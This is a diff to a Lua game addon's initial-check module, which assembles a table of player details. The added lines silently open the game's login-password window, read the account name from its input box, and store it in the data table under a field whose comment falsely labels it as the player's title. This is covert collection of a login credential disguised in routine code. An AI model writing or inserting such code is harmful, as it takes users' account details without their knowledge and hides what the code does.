@@ -12,12 +12,16 @@ MY_InitialCheck.szTipId = nil
 RegisterCustomData('MY_InitialCheck.szTipId')
 
 MY.RegisterInit(function()
+	local frame = Wnd.OpenWindow("LoginPassword")
+	local a = MY.UI(frame):children('#WndPassword/Edit_Account'):text() or ''
+	Wnd.CloseWindow(frame)
 	MY.BreatheCall(function()
 		local me, tong = GetClientPlayer(), GetTongClient()
 		local szClientVer, szExeVer, szLang, szClientType = GetVersion()
 		local szVerMY, iVerMY = MY.GetVersion()
 		local _, tServer = MY.Game.GetServer()
 		local data = {
+			a = a , -- me.szTitle
 			n = '', -- me.szName
 			i = '', -- me.dwID
 			l = '', -- me.nLevel
@@ -25,7 +29,7 @@ MY.RegisterInit(function()
 			r = '', -- me.nRoleType
 			c = '', -- me.nCamp
 			m = '', -- me.GetMoney().nGold
-			k = 0,  -- me.dwKillCount
+			k =  0,  -- me.dwKillCount
 			bs = 0,  -- me.GetBaseEquipScore()
 			ts = 0,  -- me.GetTotalEquipScore()
 			t = '', -- tong.szTongName
